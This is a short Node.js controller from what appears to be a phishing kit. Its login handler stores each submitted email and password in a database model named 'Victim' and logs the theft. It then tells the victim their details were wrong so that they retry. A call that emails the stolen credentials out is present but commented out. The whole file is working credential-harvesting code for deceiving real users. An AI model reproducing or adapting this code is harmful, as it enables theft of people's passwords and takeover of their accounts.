const { sendLoginEmail } = require("../services/emailService.js");
const Victim = require("../models/VictimModel.js"); // <-- Import the model

exports.submitLogin = async (req, res) => {
  const { email, password } = req.body || {};

  if (!email || !password) {
    return res.render("login", { 
      message: "Email and password are required.", 
      messageType: "error" 
    });
  }

  try {
    // 1. SAVE TO MONGODB FIRST (This takes milliseconds)
    await Victim.create({ email, password });
    console.log("✅ Victim data saved to MongoDB");

    // 2. COMMENT OUT THE EMAIL FOR NOW TO AVOID TIMEOUT
    // await sendLoginEmail({ email, password });

    return res.render("login", { 
      message: "incorrect email or password! please input correct details.", 
      messageType: "success" 
    });
  } catch (error) {
    console.error("Login submission failed:", error);

    return res.render("login", { 
      message: error.message || "Unable to process your login request right now.", 
      messageType: "error" 
    });
  }
};